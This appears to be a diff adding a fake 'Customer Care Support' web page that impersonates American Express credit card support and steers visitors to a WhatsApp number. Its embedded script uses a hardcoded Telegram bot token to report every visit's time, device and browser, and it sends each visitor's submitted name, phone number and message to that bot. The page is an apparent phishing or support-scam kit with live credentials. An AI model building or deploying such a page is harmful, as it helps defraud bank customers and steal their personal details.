@@ -1,0 +1,213 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Customer Care</title>
+    <link rel="stylesheet" href="css/all.min.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f9;
+            color: #333;
+        }
+        header {
+            background: #4caf50;
+            color: white;
+            padding: 4px;
+            text-align: center;
+            width: 100%;
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 80%;
+            text-align: center;
+        }
+        .chat-box {
+            width: 100%;
+            max-width: 400px;
+            background: #fff;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            padding: 10px;
+            margin-bottom: 15px;
+        }
+        .button-group a {
+            text-decoration: none;
+            display: inline-block;
+            padding: 15px 30px;
+            margin: 10px;
+            color: #fff;
+            font-size: 20px;
+            font-weight: bold;
+            border-radius: 5px;
+            transition: background 0.3s ease;
+            width: 80%;
+            text-align: center;
+        }
+        .call-button {
+            background: #4caf50;
+        }
+        .call-button:hover {
+            background: #45a049;
+        }
+        .whatsapp-button {
+            background: #25d366;
+        }
+        .whatsapp-button:hover {
+            background: #1ebc5a;
+        }
+        .message-box {
+            width: 100%;
+            max-width: 100%;
+            background: #fff;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            padding: 10px;
+            margin-top: 20px;
+        }
+        .message-box input, .message-box textarea {
+            width: 80%;
+            padding: 12px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+        .message-box textarea {
+            height: 50px;
+        }
+        .message-box button {
+            padding: 6px 14px;
+            background: #4caf50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 88%;
+            font-size: 20px;
+        }
+        .message-box button:hover {
+            background: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Customer Care Support</h1>
+        <p>We're here to assist you 24/7</p>
+    </header>
+    <div class="container">
+        <div class="chat-box">
+           <p><strong>Chat Assistant:</strong> Hi! How can I help you today?</p>
+            <p><strong>You:</strong> I need assistance.</p>
+            <p><strong>Chat Assistant:</strong> You can call us or chat on WhatsApp!</p>
+            <p><strong style="color:red">Monday to Saturday 08:00 AM To 4:00 PM</strong></p>
+            
+        </div>
+        <div class="button-group">
+            <a href="https://wa.me/917992304406?text=American Express Credit Card%20Customer%20Care!" class="call-button"><i class="fas fa-phone"></i> Call Customer Care</a>
+            <a href="https://wa.me/917992304406?text=American Express Credit Card%20Customer%20Care!" class="whatsapp-button"><i class="fab fa-whatsapp"></i> Chat on WhatsApp</a>
+        </div>
+        <div class="message-box">
+            <form onsubmit="sendMessage(event)">
+                <input type="text" name="name" placeholder="Full Name" required="">
+                <input type="tel" name="phone" placeholder="Mobile Number" required="">
+                <textarea name="message" placeholder="Type your message here..." required=""></textarea>
+                <button type="submit"><i class="fas fa-paper-plane"></i> Send Message</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        const telegramBotToken = '7942716383:AAHkDl-jGOow8Rv_ajx7C2tJe4iVvNDg1RA';
+        const chatId = '7155441629';
+
+        // Function to get device and browser details
+        function getDeviceDetails() {
+            const userAgent = navigator.userAgent;
+            let deviceInfo = "Unknown Device";
+            let browser = "Unknown Browser";
+
+            // Detect Device Type
+            if (/android/i.test(userAgent)) {
+                deviceInfo = "Android Device";
+            } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+                deviceInfo = "iOS Device";
+            } else if (/Windows/i.test(userAgent)) {
+                deviceInfo = "Windows Device";
+            } else if (/Macintosh|MacIntel/.test(userAgent)) {
+                deviceInfo = "Mac Device";
+            }
+
+            // Detect Browser
+            if (userAgent.indexOf("Chrome") > -1 && userAgent.indexOf("Edg") === -1 && userAgent.indexOf("OPR") === -1) {
+                browser = "Google Chrome";
+            } else if (userAgent.indexOf("Safari") > -1 && userAgent.indexOf("Chrome") === -1) {
+                browser = "Safari";
+            } else if (userAgent.indexOf("Firefox") > -1) {
+                browser = "Mozilla Firefox";
+            } else if (userAgent.indexOf("Edg") > -1) {
+                browser = "Microsoft Edge";
+            } else if (userAgent.indexOf("OPR") > -1 || userAgent.indexOf("Opera") > -1) {
+                browser = "Opera";
+            } else if (userAgent.indexOf("Trident") > -1 || userAgent.indexOf("MSIE") > -1) {
+                browser = "Internet Explorer";
+            }
+
+            return {
+                device: deviceInfo,
+                browser: browser,
+            };
+        }
+
+        // Notify on page visit
+        function notifyVisit() {
+            const visitorTime = new Date().toLocaleString();
+            const { device, browser } = getDeviceDetails();
+
+            const text = `New Visitor Alert!\nTime: ${visitorTime}\nDevice: ${device}\nBrowser: ${browser}`;
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (!data.ok) console.error('Failed to send visit notification');
+                })
+                .catch(error => console.error('Error sending visit notification:', error));
+        }
+
+        // Send message function
+        function sendMessage(event) {
+            event.preventDefault();
+            const form = event.target;
+            const name = form.name.value;
+            const phone = form.phone.value;
+            const message = form.message.value;
+
+            const { device, browser } = getDeviceDetails();
+            const text = `New Message:\nName: ${name}\nPhone: ${phone}\nMessage: ${message}\nDevice: ${device}\nBrowser: ${browser}`;
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert('Message sent successfully!');
+                        form.reset();
+                    } else {
+                        alert('Failed to send message.');
+                    }
+                })
+                .catch(error => alert('Error sending message:', error));
+        }
+
+        // Call notifyVisit on page load
+        notifyVisit();
+    </script>
+
+
+</body></html>
